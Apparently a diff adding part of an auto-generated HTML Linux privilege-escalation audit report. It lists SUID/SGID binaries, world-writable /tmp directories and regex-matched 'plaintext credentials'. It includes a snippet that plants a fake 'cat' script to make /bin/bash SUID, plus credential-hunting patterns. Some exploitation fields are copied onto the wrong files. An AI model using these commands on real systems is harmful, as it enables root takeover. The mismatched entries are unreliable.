+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-017: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/rlogin</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-018: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/chfn</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-019: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/fusermount</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-020: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/sg</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-021: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/su</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-022: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/sudo</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-023: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/rsh-redone-rsh</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-024: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/newgrp</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-025: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/umount.nfs4</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-026: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/mount.nfs</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-027: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/chsh</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-028: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/mount.nfs4</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-029: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/umount</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-030: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/mount.smb3</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-031: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/umount.nfs</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-032: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/passwd</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-033: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/mount.ntfs-3g</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-034: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/mount.ntfs</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-035: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/pppd</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">dip</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4754</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-high">
+                <div class="finding-header">
+                    VULN-036: Suid Binary
+                    <span>High Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/mount.cifs</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">4755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploit Method:</div>
+                    <div class="detail-value"></div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-037: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/alternatives/locate</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">plocate</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-038: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/lib/x86_64-linux-gnu/utempter/utempter</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">utmp</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-039: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/lib/xorg/Xorg.wrap</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">6755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-040: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/dotlockfile</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">mail</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-041: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/plocate</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">plocate</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-042: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/ssh-agent</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">_ssh</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-043: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/chage</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">shadow</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-044: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/sbin/unix_chkpwd</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">shadow</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-045: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/expiry</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">shadow</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-046: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/locate</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">plocate</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-047: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/crontab</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">crontab</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-048: World Writable Directory
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/tmp</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">1777</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Is Critical:</div>
+                    <div class="detail-value">False</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Create a malicious cat binary in /tmp to make /bin/bash SUID</p>
+                        <div class="code-block">echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/cat && chmod +x /tmp/cat</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-049: World Writable Directory
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/tmp/.ICE-unix</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">1777</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Is Critical:</div>
+                    <div class="detail-value">False</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Create a malicious cat binary in /tmp to make /bin/bash SUID</p>
+                        <div class="code-block">echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/cat && chmod +x /tmp/cat</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-050: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/sqlmap/sqlmap.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>guessme
+requestFile = 
+
+# Rather than providing a target URL, let Google return target
+# hosts as result of your Google dork expression. For a list of Google
+# </li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)password\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['guessme\nrequestFile = \n\n# Rather than providing a target URL, let Google return target\n# hosts as result of your Google dork expression. For a list of Google\n# ']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-051: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>root</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['root']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-052: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>root</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['root']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
+                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                    </div>
+                </div>
+                
+                </div>
